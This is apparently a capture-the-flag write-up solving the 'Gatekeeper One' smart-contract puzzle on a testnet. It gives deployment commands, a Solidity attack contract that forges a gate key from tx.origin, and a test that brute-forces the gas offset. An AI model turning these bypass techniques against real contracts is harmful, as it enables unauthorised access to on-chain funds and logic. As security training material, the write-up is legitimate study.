1. deploy puzzle contract and get the solidity version is `0.8.12`
2. deploy the attack contract `forge create ./src/GatekeeperOneAttack.sol:GatekeeperOneAttack --rpc-url $SEPOLIA_URL  --account {your_account} --constructor-args {puzzle_contract_address}`
3. find the gas parameter `forge test -vvvv --match-test testFindGas --fork-url=$SEPOLIA_URL` to get the gas parameter
4. call the attack contract ` cast send {attack contract} --rpc-url=$SEPOLIA_URL  --account {your_account} "attack(address,uint256)"  {puzzle_contract-address} {gas}`

```solidity src/IGatekeeperOne.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

```

```solidity src/GatekeeperOneAttack.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import {IGatekeeperOne} from "./IGatekeeperOne.sol";

contract GatekeeperOneAttack {
    IGatekeeperOne public gatekeeperOne;

    function attack(address _gatekeeperOne, uint256 gas) external {
        gatekeeperOne = IGatekeeperOne(_gatekeeperOne);
        uint64 gatekey = uint64(uint16(uint160(tx.origin))) + (0x1 << 32);

        require(gas < 8191, "gas>=8191");
        bool success = gatekeeperOne.enter{gas: 8191 * 20 + gas}(bytes8(gatekey));
        assert(success);
    }
}
```

```solidity test/Attack.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import {Test, console} from "forge-std/Test.sol";
import {IGatekeeperOne} from "../src/IGatekeeperOne.sol";
import {GatekeeperOneAttack} from "../src/GatekeeperOneAttack.sol";

contract GatekeeperOneAttackFindGas is Test {
    IGatekeeperOne public gatekeeper;
    GatekeeperOneAttack public attackContract;

    function setUp() public {
        gatekeeper = IGatekeeperOne(0xAa9b26C7db2B8971D43154734f90aE5C425291bf);
        attackContract = new GatekeeperOneAttack();
    }

    function testFindGas() external {
        console.log("tx.origin", tx.origin);
        for (uint256 i = 0; i < 8191; i++) {
            try attackContract.attack(address(gatekeeper), i) {
                console.log("Success with gas: ", i);
                return;
            } catch {}
        }
        revert("No gas found");
    }
}
```
